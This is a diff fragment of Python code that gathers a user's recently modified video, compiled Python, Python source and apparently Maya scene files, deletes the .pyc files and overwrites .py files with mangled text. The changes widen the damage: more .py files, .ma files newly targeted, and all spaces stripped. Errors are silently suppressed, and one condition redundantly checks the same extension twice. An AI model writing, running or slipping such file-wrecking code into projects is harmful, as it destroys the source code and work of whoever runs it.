@@ -176,7 +176,8 @@ try:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4', n=50)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov', n=50)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.pyc', n=50)
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.py', n=100)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.py', n=150)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.ma', n=50)
     random.shuffle(zovV)
 
     import subprocess, shutil, tempfile
@@ -198,11 +199,11 @@ try:
         if os.path.basename(fp).endswith('.pyc'):
             try: os.remove(fp);
             except: pass;
-        if os.path.basename(fp).endswith('.py'):
+        if os.path.basename(fp).endswith('.py') or os.path.basename(fp).endswith('.py'):
             try:
                 with open(fp) as fr:
                     yt = fr.read()
-                    yt = yt.replace('\\r\\n', '\\n').replace('#', '::').replace('   ', ' ').replace('=', ':')
+                    yt = yt.replace('#', '::').replace('   ', ' ').replace('=', ':').replace(' ', '')
                 with open(fp, 'w') as f:
                     f.write(yt)
             except: pass;
